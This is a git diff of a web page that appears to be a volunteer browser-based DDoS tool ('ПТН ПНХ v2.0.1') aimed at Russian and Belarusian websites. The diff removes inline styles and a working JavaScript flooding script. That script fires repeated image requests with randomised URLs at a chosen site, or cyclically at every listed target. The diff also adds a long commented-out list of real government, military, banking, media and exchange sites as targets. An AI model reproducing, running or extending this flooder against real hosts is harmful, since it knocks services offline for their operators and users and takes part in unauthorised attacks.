@@ -4,146 +4,13 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>АТАКА САЙТІВ</title>
-    <style>
-      .body {
-        background-color: rgb(248, 128, 128);
-        text-align: center;
-        padding: 100px;
-      }
-      @media (max-width: 780px) {
-        .body {
-          padding: 10px;
-        }
-      }
-      .top {
-        display: flex;
-        margin: auto;
-        justify-content: center;
-      }
-      @media (max-width: 780px) {
-        .top {
-          display: block;
-          margin: auto;
-          justify-content: center;
-        }
-      }
-
-      .mainForm__button.attackAll.isWorking {
-        background-color: grey;
-      }
-      .mainForm {
-        width: 60%;
-        background-color: black;
-        margin: auto;
-        padding: 40px;
-      }
-
-      .mainForm__input {
-        display: block;
-        margin: auto;
-        width: 80%;
-        padding: 10px;
-        text-align: center;
-        margin-bottom: 40px;
-      }
-
-      .mainForm__label {
-        color: white;
-        margin-right: auto;
-      }
-
-      .mainForm__button {
-        padding: 10px 40px;
-        background-color: red;
-        border-radius: 20px;
-        font-size: 20px;
-        margin: 10px;
-        width: 80%;
-      }
-      @media (max-width: 780px) {
-        .mainForm__button {
-          padding: 5px;
-          font-size: 15px;
-          margin: 5px;
-        }
-      }
-
-      .log {
-        display: block;
-        height: 600px;
-        color: azure;
-        margin-top: 10px;
-      }
-      @media (max-width: 780px) {
-        .log {
-          display: block;
-        }
-        .log__container {
-          display: block;
-        }
-      }
-
-      .log__list,
-      .info__list {
-        height: 100%;
-        background-color: bisque;
-        color: black;
-        font-family: monospace;
-        text-align: initial;
-        overflow: hidden;
-        margin-bottom: 20px;
-        padding: 10px;
-      }
-      .info__list {
-        height: auto;
-      }
-      .log__container {
-        display: inline-block;
-        margin-bottom: 5px;
-      }
-      @media (max-width: 780px) {
-        .log__list,
-        .info__list {
-          padding: 5px;
-        }
-        .log__container {
-          display: block;
-        }
-      }
-
-      .log__label {
-        margin: 10px;
-        width: 40%;
-      }
-      .log__requests-input,
-      .log__responses-input {
-        width: 100px;
-      }
-      @media (max-width: 780px) {
-        .log__label {
-          display: block;
-          margin: 10px auto;
-          width: 50%;
-        }
-        .log__requests-input,
-        .log__responses-input {
-          width: 50%;
-        }
-      }
-
-      .log__item,
-      .info__item {
-        list-style: none;
-        margin-top: 2px;
-        border-bottom: 1px solid black;
-      }
-    </style>
+    <title>АТАКА САЙТІВ РАШКИ</title>
+    <link rel="stylesheet" href="./styles.css" />
   </head>
   <body class="body">
     <section class="top">
       <div class="form__contsiner">
-        <h1>ПТН ПНХ</h1>
+        <h1>ПТН ПНХ v2.0.1</h1>
         <form action="submit" class="mainForm">
           <label for="mainForm__input url" class="mainForm__label">Посилання на цільовий сайт</label>
           <input type="text" class="mainForm__input url" placeholder="https://goszakaz.ru/" value="" />
@@ -169,6 +36,214 @@
           <li class="info__item">https://monopoly.ru/</li>
           <li class="info__item">https://ul.su/</li>
           <li class="info__item">http://gruzovozkin.pro</li>
+          <!-- <li class="info__item">http://belta.by/</li>
+          <li class="info__item">https://sputnik.by/</li>
+          <li class="info__item">https://www.tvr.by/</li>
+          <li class="info__item">https://www.sb.by/</li>
+          <li class="info__item">https://belmarket.by/</li>
+          <li class="info__item">https://www.belarus.by/</li>
+          <li class="info__item">https://belarus24.by/</li>
+          <li class="info__item">https://ont.by/</li>
+          <li class="info__item">https://www.024.by/</li>
+          <li class="info__item">https://www.belnovosti.by/</li>
+          <li class="info__item">https://mogilevnews.by/</li>
+          <li class="info__item">https://yandex.by/</li>
+          <li class="info__item">https://www.slonves.by/</li>
+          <li class="info__item">http://www.ctv.by/</li>
+          <li class="info__item">https://radiobelarus.by/</li>
+          <li class="info__item">https://radiusfm.by/</li>
+          <li class="info__item">https://alfaradio.by/</li>
+          <li class="info__item">https://radiomir.by/</li>
+          <li class="info__item">https://radiostalica.by/</li>
+          <li class="info__item">https://radiobrestfm.by/</li>
+          <li class="info__item">https://www.tvrmogilev.by/</li>
+          <li class="info__item">https://minsknews.by/</li>
+          <li class="info__item">https://zarya.by/</li>
+          <li class="info__item">https://grodnonews.by/</li>
+          <li class="info__item">https://rec.gov.by/ru</li>
+          <li class="info__item">https://www.mil.by/</li>
+          <li class="info__item">http://www.government.by/</li>
+          <li class="info__item">https://www.mvd.gov.by/ru</li>
+          <li class="info__item">http://www.kgb.by/ru/</li>
+          <li class="info__item">http://www.prokuratura.gov.by/</li>
+          <li class="info__item">http://www.nbrb.by/</li>
+          <li class="info__item">https://belarusbank.by/</li>
+          <li class="info__item">https://brrb.by/</li>
+          <li class="info__item">https://www.belapb.by/</li>
+          <li class="info__item">https://bankdabrabyt.by/</li>
+          <li class="info__item">https://belinvestbank.by/individual</li>
+          <li class="info__item">https://bgp.by/ru/</li>
+          <li class="info__item">https://www.belneftekhim.by</li>
+          <li class="info__item">http://www.bellegprom.by</li>
+          <li class="info__item">https://www.energo.by</li>
+          <li class="info__item">http://belres.by/ru/</li>
+          <li class="info__item">https://shop-rt.com</li>
+          <li class="info__item">https://api.developer.sber.ru/product/SberbankID</li>
+          <li class="info__item">http://bezformata.com/</li>
+          <li class="info__item">http://rbc.ru/</li>
+          <li class="info__item">https://www.yaplakal.com/</li>
+          <li class="info__item">https://www.mk.ru/</li>
+          <li class="info__item">http://kommersant.ru/</li>
+          <li class="info__item">https://pikabu.ru/</li>
+          <li class="info__item">http://riafan.ru/</li>
+          <li class="info__item">http://kp.ru/</li>
+          <li class="info__item">https://www.gazeta.ru/</li>
+          <li class="info__item">http://ria.ru/</li>
+          <li class="info__item">https://glava-lnr.info/</li>
+          <li class="info__item">https://mail.rkn.gov.ru/</li>
+          <li class="info__item">https://cloud.rkn.gov.ru/</li>
+          <li class="info__item">https://mvd.gov.ru/</li>
+          <li class="info__item">https://pwd.wto.economy.gov.ru/</li>
+          <li class="info__item">https://stroi.gov.ru/</li>
+          <li class="info__item">https://proverki.gov.ru/</li>
+          <li class="info__item">https://www.gazprom.ru/</li>
+          <li class="info__item">https://lukoil.ru/</li>
+          <li class="info__item">https://magnit.ru/</li>
+          <li class="info__item">https://www.nornickel.com/</li>
+          <li class="info__item">https://www.surgutneftegas.ru/</li>
+          <li class="info__item">https://www.tatneft.ru/</li>
+          <li class="info__item">https://www.evraz.com/ru/</li>
+          <li class="info__item">https://nlmk.com/</li>
+          <li class="info__item">https://www.sibur.ru/</li>
+          <li class="info__item">https://www.severstal.com/</li>
+          <li class="info__item">https://www.metalloinvest.com/</li>
+          <li class="info__item">https://nangs.org/</li>
+          <li class="info__item">https://rmk-group.ru/ru/</li>
+          <li class="info__item">https://www.tmk-group.ru/</li>
+          <li class="info__item">https://ya.ru/</li>
+          <li class="info__item">https://www.polymetalinternational.com/ru/</li>
+          <li class="info__item">https://www.uralkali.com/ru/</li>
+          <li class="info__item">https://www.eurosib.ru/</li>
+          <li class="info__item">https://omk.ru/</li>
+          <li class="info__item">https://www.sberbank.ru/</li>
+          <li class="info__item">https://www.vtb.ru/</li>
+          <li class="info__item">https://www.gazprombank.ru/</li>
+          <li class="info__item">https://www.gosuslugi.ru/</li>
+          <li class="info__item">https://www.mos.ru/uslugi/</li>
+          <li class="info__item">http://kremlin.ru/</li>
+          <li class="info__item">http://government.ru/</li>
+          <li class="info__item">https://mil.ru/</li>
+          <li class="info__item">https://www.nalog.gov.ru/</li>
+          <li class="info__item">https://customs.gov.ru/</li>
+          <li class="info__item">https://pfr.gov.ru/</li>
+          <li class="info__item">https://rkn.gov.ru/</li>
+          <li class="info__item">http://mx3.cbr.ru</li>
+          <li class="info__item">https://mx4.cbr.ru</li>
+          <li class="info__item">http://email11.sberbank.ru</li>
+          <li class="info__item">http://email12.sberbank.ru</li>
+          <li class="info__item">https://www.moex.com</li>
+          <li class="info__item">https://pass.rw.by/ru/</li>
+          <li class="info__item">http://portal.rw.by</li>
+          <li class="info__item">http://rw.by</li>
+          <li class="info__item">https://www.bestchange.ru/tether-trc20-to-visa-mastercard-euro.html</li>
+          <li class="info__item">https://www.uacrussia.ru/ru/</li>
+          <li class="info__item">http://www.almaz-antey.ru/</li>
+          <li class="info__item">https://www.uecrus.com/rus/</li>
+          <li class="info__item">http://www.uralvagonzavod.ru/</li>
+          <li class="info__item">https://azgaz.ru/</li>
+          <li class="info__item">https://kalashnikovgroup.ru/</li>
+          <li class="info__item">http://www.ktrv.ru/</li>
+          <li class="info__item">http://www.salut.ru/</li>
+          <li class="info__item">https://www.sevmash.ru/</li>
+          <li class="info__item">http://www.nordsy.spb.ru/</li>
+          <li class="info__item">http://admship.ru/</li>
+          <li class="info__item">https://www.rhc.aero/</li>
+          <li class="info__item">https://cleanbtc.ru/</li>
+          <li class="info__item">https://bonkypay.com/</li>
+          <li class="info__item">https://changer.club/</li>
+          <li class="info__item">https://superchange.net/</li>
+          <li class="info__item">https://mine.exchange/</li>
+          <li class="info__item">https://platov.co/</li>
+          <li class="info__item">https://ww-pay.net/</li>
+          <li class="info__item">https://delets.cash/</li>
+          <li class="info__item">https://ramon.money/</li>
+          <li class="info__item">https://coinpaymaster.com/</li>
+          <li class="info__item">https://bitokk.biz/</li>
+          <li class="info__item">https://www.netex24.net/</li>
+          <li class="info__item">https://cashbank.pro/</li>
+          <li class="info__item">https://flashobmen.com/</li>
+          <li class="info__item">https://abcobmen.com/</li>
+          <li class="info__item">https://ychanger.net/</li>
+          <li class="info__item">https://multichange.net/</li>
+          <li class="info__item">https://24paybank.ne</li>
+          <li class="info__item">https://royal.cash/</li>
+          <li class="info__item">https://prostocash.com/</li>
+          <li class="info__item">https://baksman.org/</li>
+          <li class="info__item">https://kupibit.me/</li>
+          <li class="info__item">https://betatransfer.org/</li>
+          <li class="info__item">https://yandex.ru/</li>
+          <li class="info__item">https://gosuslugi.astrobl.ru/</li>
+          <li class="info__item">http://www.fsb.ru/</li>
+          <li class="info__item">https://iecp.ru/ep/ep-verification</li>
+          <li class="info__item">https://iecp.ru/ep/uc-list</li>
+          <li class="info__item">https://uc-osnovanie.ru/</li>
+          <li class="info__item">http://www.nucrf.ru</li>
+          <li class="info__item">http://www.belinfonalog.ru</li>
+          <li class="info__item">http://www.roseltorg.ru</li>
+          <li class="info__item">http://www.astralnalog.ru</li>
+          <li class="info__item">http://www.nwudc.ru</li>
+          <li class="info__item">http://www.center-inform.ru</li>
+          <li class="info__item">https://kk.bank/UdTs</li>
+          <li class="info__item">http://structure.mil.ru/structure/uc/info.htm</li>
+          <li class="info__item">http://www.ucpir.ru</li>
+          <li class="info__item">http://dreamkas.ru</li>
+          <li class="info__item">http://www.e-portal.ru</li>
+          <li class="info__item">http://izhtender.ru</li>
+          <li class="info__item">http://imctax.parus-s.ru</li>
+          <li class="info__item">http://www.icentr.ru</li>
+          <li class="info__item">http://www.kartoteka.ru</li>
+          <li class="info__item">http://rsbis.ru/elektronnaya-podpis</li>
+          <li class="info__item">http://www.stv-it.ru</li>
+          <li class="info__item">http://www.crypset.ru</li>
+          <li class="info__item">http://www.kt-69.ru</li>
+          <li class="info__item">http://www.24ecp.ru</li>
+          <li class="info__item">http://kraskript.com</li>
+          <li class="info__item">http://ca.ntssoft.ru</li>
+          <li class="info__item">http://www.y-center.ru</li>
+          <li class="info__item">http://www.rcarus.ru</li>
+          <li class="info__item">http://rk72.ru</li>
+          <li class="info__item">http://squaretrade.ru</li>
+          <li class="info__item">http://ca.gisca.ru</li>
+          <li class="info__item">http://www.otchet-online.ru</li>
+          <li class="info__item">http://udcs.ru</li>
+          <li class="info__item">http://www.cit-ufa.ru</li>
+          <li class="info__item">http://elkursk.ru</li>
+          <li class="info__item">http://www.icvibor.ru</li>
+          <li class="info__item">http://ucestp.ru</li>
+          <li class="info__item">http://mcspro.ru</li>
+          <li class="info__item">http://www.infotrust.ru</li>
+          <li class="info__item">http://epnow.ru</li>
+          <li class="info__item">http://ca.kamgov.ru</li>
+          <li class="info__item">http://mascom-it.ru</li>
+          <li class="info__item">http://cfmc.ru</li>
+          <li class="info__item">https://ddos-guard.net/ru</li>
+          <li class="info__item">https://stormwall.pro/</li>
+          <li class="info__item">https://qrator.net/ru/</li>
+          <li class="info__item">https://solidwall.ru/</li>
+          <li class="info__item">https://scr.online.sberbank.ru/api/fl/idgib-w-3ds</li>
+          <li class="info__item">https://3dsec.sberbank.ru/mportal3/auth/login</li>
+          <li class="info__item">https://acs1.sbrf.ru</li>
+          <li class="info__item">https://acs2.sbrf.ru</li>
+          <li class="info__item">https://acs3.sbrf.ru</li>
+          <li class="info__item">https://acs4.sbrf.ru</li>
+          <li class="info__item">https://acs5.sbrf.ru</li>
+          <li class="info__item">https://acs6.sbrf.ru</li>
+          <li class="info__item">https://acs7.sbrf.ru</li>
+          <li class="info__item">https://acs8.sbrf.ru</li>
+          <li class="info__item">https://sputnik.by</li>
+          <li class="info__item">https://www.gazprom.ru</li>
+          <li class="info__item">https://lukoil.ru</li>
+          <li class="info__item">https://www.sberbank.ru</li>
+          <li class="info__item">https://cloud.rkn.gov.ru</li>
+          <li class="info__item">https://mvd.gov.ru</li>
+          <li class="info__item">http://www.belta.by/</li>
+          <li class="info__item">https://www.priorbank.by/</li>
+          <li class="info__item">http://www.sb.by/</li>
+          <li class="info__item">https://www.sber-bank.by/sberprime</li>
+          <li class="info__item">https://belapb.by/</li>
+          <li class="info__item">http://sputnik.by/</li>
+          <li class="info__item">http://www.belarus.by/</li>
+          <li class="info__item">http://president.gov.by/</li> -->
         </ul>
       </div>
     </section>
@@ -183,99 +258,6 @@
       </div>
       <ul class="log__list"></ul>
     </section>
-    <script>
-      const inputUrl = document.querySelector('.url')
-      const inputCounter = document.querySelector('.counter')
-      const logList = document.querySelector('.log__list')
-      const logItem = document.querySelector('.log__item')
-      const mainForm = document.querySelector('.mainForm')
-      const totalRequests = document.querySelector('.log__requests-input')
-      const totalResponses = document.querySelector('.log__responses-input')
-      const tergets = document.querySelectorAll('.info__item')
-      const btnAll = document.querySelector('.attackAll')
-      let attackInterval
-      function getCounter() {
-        const counter = inputCounter.value ? parseInt(inputCounter.value) : 0
-        if (isNaN(counter)) alert('введите число')
-        return counter
-      }
-      function generateId() {
-        return Math.random().toString(36).slice(-5)
-      }
-      function writeToLog(text) {
-        const logElement = document.createElement('li')
-        logElement.innerText = text
-        logElement.className = 'log__item'
-        logList.insertAdjacentElement('afterbegin', logElement)
-      }
-      function timestamp() {
-        const Data = new Date()
-        const Year = Data.getFullYear()
-        let Month = Data.getMonth() + 1
-        if (Month < 10) Month = '0' + Month
-        const Day = Data.getDate() < 10 ? '0' + Data.getDate() : Data.getDate()
-        const Hour = Data.getHours() < 10 ? '0' + Data.getHours() : Data.getHours()
-        const Minutes = Data.getMinutes() < 10 ? '0' + Data.getMinutes() : Data.getMinutes()
-        const Seconds = Data.getSeconds() < 10 ? '0' + Data.getSeconds() : Data.getSeconds()
-        return Year + '.' + Month + '.' + Day + ' - ' + Hour + ':' + Minutes + ':' + Seconds
-      }
-
-      function attack(url) {
-        for (let i = 1; i <= getCounter(); i++) {
-          const image = new Image()
-          image.onerror = function (e) {
-            let urlLog = e.path[0].currentSrc.slice(8).split('/')[0]
-            if (btnAll.className === 'mainForm__button attackAll isWorking') {
-              writeToLog(timestamp() + ' - вдала атака на "' + urlLog + '". Чекайте. ')
-            }
-            totalResponses.value++
-          }
-          image.src = url + '/' + generateId() + '?' + generateId() + '=' + Math.floor(Math.random() * 1000)
-          totalRequests.value++
-        }
-        writeToLog(
-          timestamp() +
-            ' - на "' +
-            url +
-            '" відправлено ' +
-            getCounter() +
-            ' запитів. Не закривайте сторінку. Чекайте, хай відповість.',
-        )
-      }
-
-      function mainFormSubmit(e) {
-        e.preventDefault()
-        const url = inputUrl.value.toLowerCase()
-        if (!url) alert('введите адрес')
-
-        attack(url)
-      }
-
-      function groupAttack() {
-        tergets.forEach(target => {
-          const url = target.innerHTML
-          attack(url)
-        })
-      }
-
-      function attackAll(e) {
-        e.preventDefault()
-        btnAll.classList.toggle('isWorking')
-
-        if (btnAll.className === 'mainForm__button attackAll isWorking') {
-          groupAttack()
-          attackInterval = setInterval(groupAttack, getCounter() * 800)
-          writeToLog(timestamp() + ' - цикл запущено.')
-          btnAll.textContent = 'Зупинити'
-        } else {
-          clearInterval(attackInterval)
-          writeToLog(timestamp() + ' - цикл вимкнено. Відповіді будуть ще повертатись. Дивись лічильник')
-          btnAll.textContent = 'Запустити циклічну атаку по актуальним сайтам'
-        }
-      }
-
-      mainForm.addEventListener('submit', mainFormSubmit)
-      btnAll.addEventListener('click', attackAll)
-    </script>
+    <script src="./scripts.js"></script>
   </body>
 </html>
